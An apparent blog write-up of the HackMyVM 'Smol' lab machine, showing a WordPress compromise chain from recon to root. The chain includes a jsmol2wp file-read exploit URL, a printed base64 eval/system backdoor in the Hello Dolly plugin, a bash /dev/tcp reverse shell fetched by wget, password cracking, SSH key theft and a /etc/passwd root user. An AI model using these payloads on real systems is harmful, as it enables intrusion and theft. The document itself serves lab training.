---
title: HackMyVM-Smol
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# Smol.

> https://hackmyvm.eu/machines/machine.php?vm=Smol
> 

Notes: **I hope you will enjoy it.**

## 信息收集

```python
nmap -sP 192.168.56.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 01:24 EST
Nmap scan report for 192.168.56.1
Host is up (0.00030s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00024s latency).
MAC Address: 08:00:27:4C:6C:28 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.16
Host is up (0.00031s latency).
MAC Address: 08:00:27:75:EE:3F (Oracle VirtualBox virtual NIC)
```

```python
nmap -sT -min-rate 10000 -p- 192.168.56.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 01:25 EST
Nmap scan report for 192.168.56.16
Host is up (0.00039s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:75:EE:3F (Oracle VirtualBox virtual NIC)
```

```python
nmap -sT -sV -A -T4 80 192.168.56.16  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 01:55 EST
Nmap scan report for www.smol.hmv (192.168.56.16)
Host is up (0.00044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 6.3
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: AnotherCTF
MAC Address: 08:00:27:75:EE:3F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms www.smol.hmv (192.168.56.16)
```

```python
nmap -script=vuln -p- 192.168.56.16   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 01:27 EST
Nmap scan report for 192.168.56.16
Host is up (0.00042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 08:00:27:75:EE:3F (Oracle VirtualBox virtual NIC)
```

## 渗透

优先级 `80` > `22`

### web 渗透

访问一下`web`页面（需要修改一下`hosts`文件，把域名指向靶机`IP`）

通过`Wappalyzer`可以看到是用`WordPress 6.3`搭建的

![image.png](image%2048.png)

### WPScan

因为是使用WordPress搭建的，就可以使用`WPScan` 来扫描了

```python
wpscan --url http://www.smol.hmv -eu                                                                                                                     
_______________________________________________________________               
         __          _______   _____                                          
         \ \        / /  __ \ / ____|                                         
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                        
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \                                                                                                        
            \  /\  /  | |     ____) | (__| (_| | | | |                                                                                                       
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|    
                                                                                                                                                             
         WordPress Security Scanner by the WPScan Team                        
                         Version 3.8.27                                      
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                        
_______________________________________________________________               
                                                                              
[+] URL: http://www.smol.hmv/ [192.168.56.16]         
[+] Started: Wed Feb  5 02:12:38 2025                                         
                                                                              
Interesting Finding(s):                                                       
                                                                                                                                                             
[+] Headers                                                                                                                                                  
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)                          
 | Found By: Headers (Passive Detection)
 | Confidence: 100%                                                           
                                                                              
[+] XML-RPC seems to be enabled: http://www.smol.hmv/xmlrpc.php      
 | Found By: Direct Access (Aggressive Detection)             
 | Confidence: 100%                                                                                                                                          
 | References:                                                                
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/                                
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/                                                                       
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/                                                                    
                                                                              
[+] WordPress readme found: http://www.smol.hmv/readme.html                   
 | Found By: Direct Access (Aggressive Detection)                             
 | Confidence: 100%                                                           
                                                                                                                                                             
[+] Upload directory has listing enabled: http://www.smol.hmv/wp-content/uploads/                                                                            
 | Found By: Direct Access (Aggressive Detection)         
 | Confidence: 100%                                                                                                                                          
                                                                              
[+] The external WP-Cron seems to be enabled: http://www.smol.hmv/wp-cron.php 
 | Found By: Direct Access (Aggressive Detection)                             
 | Confidence: 60%                                                            
 | References:                                                                
 |  - https://www.iplocation.net/defend-wordpress-from-ddos                   
 |  - https://github.com/wpscanteam/wpscan/issues/1299                        
                                                                              
[+] WordPress version 6.3 identified (Insecure, released on 2023-08-08).      
 | Found By: Rss Generator (Passive Detection)                                
 |  - http://www.smol.hmv/index.php/feed/, <generator>https://wordpress.org/?v=6.3</generator>                                                               
 |  - http://www.smol.hmv/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.3</generator>                                                      
                                                                              
[+] WordPress theme in use: popularfx                                         
 | Location: http://www.smol.hmv/wp-content/themes/popularfx/                 
 | Last Updated: 2024-11-19T00:00:00.000Z                                     
 | Readme: http://www.smol.hmv/wp-content/themes/popularfx/readme.txt
 | [!] The version is out of date, the latest version is 1.2.6                
 | Style URL: http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5                                                                            
 | Style Name: PopularFX                                                      
 | Style URI: https://popularfx.com                                           
 | Description: Lightweight theme to make beautiful websites with Pagelayer. Includes 100s of pre-made templates to ...                                      
 | Author: Pagelayer                     
 | Author URI: https://pagelayer.com                                                                                                                         
 |                                                                                                                                                           
 | Found By: Css Style In Homepage (Passive Detection)                        
 |                                                                            
 | Version: 1.2.5 (80% confidence)                                            
 | Found By: Style (Passive Detection)                                        
 |  - http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5, Match: 'Version: 1.2.5'                                                           
                                                                                                                                                             
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================> (10 / 10) 100.00% Time: 00:00:00
                                                                              
[i] User(s) Identified:                                                       
                                                                              
[+] think                                                                     
 | Found By: Author Posts - Author Pattern (Passive Detection)                
 | Confirmed By:                                                              
 |  Wp Json Api (Aggressive Detection)                                        
 |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&page=1 
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)           
 |  Login Error Messages (Aggressive Detection)                               
                                                                                                                                                             
[+] wp                                                                                                                                                       
 | Found By: Author Posts - Author Pattern (Passive Detection)                
 | Confirmed By:                                                              
 |  Wp Json Api (Aggressive Detection)                                        
 |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&page=1 
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)  
                                                                              
[+] Jose Mario Llado Marti                                                                                                                                   
 | Found By: Rss Generator (Passive Detection)                                
                                                                              
[+] wordpress user                                                                                                                                           
 | Found By: Rss Generator (Passive Detection)  
[+] admin                                                                                                                                                    
 | Found By: Wp Json Api (Aggressive Detection)                               
 |  - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&page=1  
 | Confirmed By:                                                              
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)           
 |  Login Error Messages (Aggressive Detection)                                                                                                              
                                                                                                                                                             
[+] gege                                                                      
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)                                                                                 
 | Confirmed By: Login Error Messages (Aggressive Detection)                  
                                                                              
[+] diego                                                                     
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)  
 | Confirmed By: Login Error Messages (Aggressive Detection)                  
                                                                              
[+] xavi                                                                      
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)  
 | Confirmed By: Login Error Messages (Aggressive Detection)                  

[i] Plugin(s) Identified:                                                     
                                                                              
[+] jsmol2wp                                                                  
 | Location: http://www.smol.hmv/wp-content/plugins/jsmol2wp/                 
 | Latest Version: 1.07 (up to date)                                          
 | Last Updated: 2018-03-09T10:28:00.000Z             
 |                                     
 | Found By: Urls In Homepage (Passive Detection)                             
 |                                                                            
 | Version: 1.07 (100% confidence)                                                                                                                           
 | Found By: Readme - Stable Tag (Aggressive Detection)                                                                                                      
 |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt              
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)            
 |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt 
                                                                              
[!] No WPScan API Token given, as a result vulnerability data has not been output.                                                                           
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register                                                        
                                                                              
[+] Finished: Wed Feb  5 02:12:41 2025                                        
[+] Requests Done: 65                                                         
[+] Cached Requests: 6                                                        
[+] Data Sent: 17.352 KB                                                      
[+] Data Received: 372.886 KB                                                 
[+] Memory used: 184.168 MB                                                                                                                                  
[+] Elapsed time: 00:00:02           
```

`WordPress`版本和之前扫描的一样，扫描出一个插件`jsmol2wp` ，到互联网上找一下漏洞

### jsmol2wp 利用

> https://cn-sec.com/archives/1247521.html
> 

在网上找到一个该插件的任意文件读取漏洞 **CVE-2018-20463**

影响范围：WordPress JSmol2WP Plugin 1.07

```python
POC:
http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

![image.png](image%2049.png)

```python
/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
```

拿到数据库用户名密码，尝试登陆`WordPress` ，登陆成功

![image.png](image%2050.png)

### WordPress 利用

尝试了下在新建文章里面执行`PHP`代码，但是不成功，模板的方法反弹`shell`需要管理员用户才能进行

然后在控制面板的`Dashboard`里面可以找到一个私人的`page` ，是管理员的任务清单

![image.png](image%2051.png)

会发现他们在说关于后门的插件的事情， “`Hello Dolly` ”插件

![image.png](image%2052.png)

### 扫描网站目录

```python
┌──(root㉿kali)-[~]                                                                                                                                          
└─# dirsearch -u http://www.smol.hmv -x 403 -e php,zip,txt
[02:26:38] Starting:                                                                                                                                         
[02:26:52] 301 -    0B  - /index.php  ->  http://www.smol.hmv/                                                                                               
[02:26:52] 404 -   19KB - /index.php/login/                                                                                                                  
[02:26:54] 200 -    7KB - /license.txt                                                                                                                       
[02:26:59] 200 -    3KB - /readme.html                                                                                                                       
[02:27:06] 301 -  315B  - /wp-admin  ->  http://www.smol.hmv/wp-admin/                                                                                       
[02:27:06] 400 -    1B  - /wp-admin/admin-ajax.php                                                                                                           
[02:27:06] 302 -    0B  - /wp-admin/  ->  http://www.smol.hmv/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.hmv%2Fwp-admin%2F&reauth=1                      
[02:27:06] 200 -    0B  - /wp-config.php                                                                                                                     
[02:27:06] 200 -  495B  - /wp-admin/install.php                                                                                                              
[02:27:06] 500 -    3KB - /wp-admin/setup-config.php                                                                                                         
[02:27:06] 200 -    0B  - /wp-content/ 
[02:27:07] 200 -   84B  - /wp-content/plugins/akismet/akismet.php                                                                                            
[02:27:07] 500 -    0B  - /wp-content/plugins/hello.php                                                                                                      
[02:27:07] 200 -  521B  - /wp-content/uploads/                                                                                                               
[02:27:07] 200 -  414B  - /wp-content/upgrade/                                                                                                               
[02:27:07] 301 -  318B  - /wp-includes  ->  http://www.smol.hmv/wp-includes/                                                                                 
[02:27:07] 200 -    0B  - /wp-includes/rss-functions.php                                                                                                     
[02:27:07] 200 -    0B  - /wp-cron.php                                                                                                                       
[02:27:07] 200 -    2KB - /wp-login.php                                                                                                                      
[02:27:07] 302 -    0B  - /wp-signup.php  ->  http://www.smol.hmv/wp-login.php?action=register                                                               
[02:27:07] 200 -    4KB - /wp-includes/
```

### hello.php 插件利用

可以发现在插件目录存在`hello.php`文件，我们使用任意文件读取漏洞读取一下

```python
# /wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php

<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

function hello_dolly_get_lyric() {
	/** These are the lyrics to Hello Dolly */
	$lyrics = "Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, take her wrap, fellas
Dolly, never go away again
Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, golly, gee, fellas
Have a little faith in me, fellas
Dolly, never go away
Promise, you'll never go away
Dolly'll never go away again";

	// Here we split it into lines.
	$lyrics = explode( "\n", $lyrics );

	// And then randomly choose a line.
	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
}

// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
	
	$chosen = hello_dolly_get_lyric();
	$lang   = '';
	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
		$lang = ' lang="en"';
	}

	printf(
		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
		$lang,
		$chosen
	);
}

// Now we set that function up to execute when the admin_notices action is called.
add_action( 'admin_notices', 'hello_dolly' );

// We need some CSS to position the paragraph.
function dolly_css() {
	echo "
	<style type='text/css'>
	#dolly {
		float: right;
		padding: 5px 10px;
		margin: 0;
		font-size: 12px;
		line-height: 1.6666;
	}
	.rtl #dolly {
		float: left;
	}
	.block-editor-page #dolly {
		display: none;
	}
	@media screen and (max-width: 782px) {
		#dolly,
		.rtl #dolly {
			float: none;
			padding-left: 0;
			padding-right: 0;
		}
	}
	</style>
	";
}

add_action( 'admin_head', 'dolly_css' );
```

可以看到就是提到的插件，其中有令人在意的内容

```python
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

将`base64`解码后得到： 

```python
 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } 
```

实际上就是

```python
if (isset($_GET["cmd"])) { system($_GET["cmd"]); } 
```

最后，插件通过 `add_action('admin_notices', 'hello_dolly');` 将 `hello_dolly()` 函数绑定到 `admin_notices` 钩子。这意味着只要进入 WordPress 的后台页面，就会自动调用 `hello_dolly()` 函数，在页面右上角显示一段随机歌词

![image.png](image%2053.png)

那么我们在后台页面进行测试，成功读取文件

![image.png](image%2054.png)

### 反弹shell

不能直接进行反弹，我们需要通过创建传递恶意文件，再通过后门来执行

1. 创建恶意文件`shell.sh`（反弹`shell`使用）
    
    ```python
    # shell.sh
    /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.4/4444 0>&1'
    ```
    
2. 然后开启`http`服务器
    
    ```python
    ┌──(root㉿kali)-[~/Desktop/test/SMOL]
    └─# php -S 0:80  
    [Wed Feb  5 04:50:25 2025] PHP 8.2.24 Development Server (http://0:80) started
    ```
    
3. 然后通过后门读取文件然后保存到临时文件夹
    
    ```python
    http://www.smol.hmv/wp-admin/index.php?cmd=wget 192.168.56.4/shell.sh -O /tmp/shell.sh
    ```
    
4. `kali`开启监听
    
    ```python
    ┌──(root㉿kali)-[~]
    └─# nc -lvp 4444
    listening on [any] 4444 ...
    ```
    
5. 最后通过后门来执行刚刚保存的文件
    
    ```python
    http://www.smol.hmv/wp-admin/index.php?cmd=/bin/bash /tmp/shell.sh
    ```
    
6. 最终得到`shell`
    
    ```python
    ┌──(root㉿kali)-[~]
    └─# nc -lvp 4444  
    listening on [any] 4444 ...
    connect to [192.168.56.4] from www.smol.hmv [192.168.56.16] 42818
    bash: cannot set terminal process group (788): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@smol:/var/www/wordpress/wp-admin$ 
    ```
    
    ```python
    mysql> select * from wp_users;
    select * from wp_users;
    +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
    | ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
    +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
    |  1 | admin      | $P$B5Te3OJvzvJ7NjDDeHZcOKqsQACvOJ0 | admin         | admin@smol.thm     | http://www.smol.hmv | 2023-08-16 06:58:30 |                     |           0 | admin                  |
    |  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
    |  3 | think      | $P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
    |  4 | gege       | $P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
    |  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@smol.thm     | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
    |  6 | xavi       | $P$BvcalhsCfVILp2SgttADny40mqJZCN/ | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
    +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
    6 rows in set (0.00 sec)
    ```
    

## 提权

### 数据库

因为我们之前得到了数据库的用户名和密码，所以我们拉取一下数据库的数据

```python
www-data@smol:/var/www/wordpress/wp-admin$ mysql -u wpuser -p
mysql -u wpuser -p
Enter password: kbLSF2Vop#lw3rjDZ629*Z%G

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 61371
Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

然后拿到开膛手杰克进行破解，最后能爆破出一个密码 `sandiegocalifornia`

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sandiegocalifornia (?)  
```

本来想通过ssh来登录，但是提示须要`SSH`私钥

最后通过`su`的方法来切换用户，最后可以切换到`diego`用户

```python
www-data@smol:/var/www/wordpress/wp-admin$ su diego
su diego
Password: sandiegocalifornia

diego@smol:/var/www/wordpress/wp-admin$ 
```

### UserFlag

`userflag`就在`diego`用户的家目录下

```python
diego@smol:~$ cat user.txt
45edaec653ff9ee06236b7ce72b86963
```

### 提权  - think用户

然后在`think`用户的家目录可以找到`ssh`的私钥文件，将其保存到`kali` 上，然后使用私钥文件登录

1. 开启`python`的`http`服务器
    
    ```python
    diego@smol:/home/think/.ssh$ python3 -m http.server 8001
    Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
    ```
    
2. 将其拉取到`kali`
    
    ```python
    ┌──(root㉿kali)-[~/Desktop/test/SMOL]
    └─# wget 192.168.56.16:8001/id_rsa           
    --2025-02-05 05:38:21--  http://192.168.56.16:8001/id_rsa
    正在连接 192.168.56.16:8001... 已连接。
    已发出 HTTP 请求，正在等待回应... 200 OK
    长度：2602 (2.5K) [application/octet-stream]
    正在保存至: “id_rsa”
    
    id_rsa             100%[==============>]   2.54K  --.-KB/s  用时 0s      
    
    2025-02-05 05:38:21 (402 MB/s) - 已保存 “id_rsa” [2602/2602])
    ```
    
3. 使用私钥文件登录，成功登录
    
    ```python
    ┌──(root㉿kali)-[~/Desktop/test/SMOL]
    └─# ssh think@192.168.56.16 -i id_rsa
    Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
      System information as of Wed 05 Feb 2025 06:40:43 PM UTC
    
      System load:  0.06              Processes:                218
      Usage of /:   55.8% of 9.75GB   Users logged in:          0
      Memory usage: 35%               IPv4 address for enp0s17: 192.168.56.16
      Swap usage:   0%
    
    Expanded Security Maintenance for Applications is not enabled.
    
    162 updates can be applied immediately.
    125 of these updates are standard security updates.
    To see these additional updates run: apt list --upgradable
    
    Enable ESM Apps to receive additional future security updates.
    See https://ubuntu.com/esm or run: sudo pro status
    
    The list of available updates is more than a week old.
    To check for new updates run: sudo apt update
    
    think@smol:~$ 
    ```
    
4. 在`gege`用户加目录下发现`wordpress.old.zip`文件，但是没有权限读取
    
    ```python
    think@smol:/home/gege$ ls -al                                                                                                                                
    total 31532                                                                                                                                                  
    drwxr-x--- 2 gege internal     4096 Aug 18  2023 .                                                                                                           
    drwxr-xr-x 6 root root         4096 Aug 16  2023 ..                           
    lrwxrwxrwx 1 root root            9 Aug 18  2023 .bash_history -> /dev/null   
    -rw-r--r-- 1 gege gege          220 Feb 25  2020 .bash_logout                 
    -rw-r--r-- 1 gege gege         3771 Feb 25  2020 .bashrc                      
    -rw-r--r-- 1 gege gege          807 Feb 25  2020 .profile                     
    lrwxrwxrwx 1 root root            9 Aug 18  2023 .viminfo -> /dev/null                                                                                       
    -rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip
    
    think@smol:/home/gege$ cat wordpress.old.zip                                                                                                                 
    cat: wordpress.old.zip: Permission denied 
    ```
    
5. 查看一下`id`组，发现属于`dev`组
    
    ```python
    think@smol:/home/gege$ id                                                                                                                                    
    uid=1000(think) gid=1000(think) groups=1000(think),1004(dev),1005(internal) 
    ```
    
    查看组内成员
    
    ```python
    think@smol:/home/gege$ cat /etc/group | grep dev
    plugdev:x:46:
    dev:x:1004:think,gege
    ```
    
    切换`gege`用户，发现不用密码，然后再切换回去就要密码了，一开始我以为是因为gege用户没有密码，但是我尝试了`sudo -l`后，输入空密码但是错误，所以可能是再`/etc/sudoers`文件里面设置了`think`用户切换`gege`用户无需密码
    
    ```python
    think@smol:/home/gege$ su gege
    gege@smol:~$
    ```
    
6. 尝试解压`wordpress.old.zip` 发现需要密码，将其拉取下来准备破解
    
    ```python
    gege@smol:~$ unzip wordpress.old.zip 
    Archive:  wordpress.old.zip
    [wordpress.old.zip] wordpress.old/wp-config.php password:
    ```
    

### wordpress.old.zip

使用`fcrackzip`来破解，爆破出密码`hero_gege@hotmail.com`

```python
┌──(root㉿kali)-[~/Desktop/test/SMOL]
└─# fcrackzip -D -p /usr/share/wordlists/rockyou.txt wordpress.old.zip   
possible pw found: hero_gege@hotmail.com ()
```

查看里面的文件，寻找有用的信息

在`wp-config.php`中可以找到`xavi`用户的密码

```python
/** Database username */                                                      
define( 'DB_USER', 'xavi' );                                                  
                                       
/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
```

我们直接从`gege`用户直接`su`到`xavi`用户

```python
gege@smol:~$ su xavi
Password: 
xavi@smol:/home/gege$
```

### 提权

因为有了密码，我们可以查看`sudo`的信息了，发现可以使用`root`的权限修改`/etc/passwd`

```python
xavi@smol:~$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) /usr/bin/vi /etc/passwd

```

那么这就可以获取到`root`权限了，我们直接新建一个用户，把它的权限设置为和`root`相当即可

添加新用户`sunset`密码是`hack` ，修改完毕后保存并退出

```python
sunset:zSZ7Whrr8hgwY:0:0:root:/root:/usr/bin/bash
```

切换用户，成功获取到`root`权限

```python
xavi@smol:~$ su sunset
Password: 
root@smol:/home/xavi$ 
```

### RootFlag

```python
root@smol:/home/xavi$ cat /root/root.txt 
bf89ea3ea01992353aef1f576214d4e4
```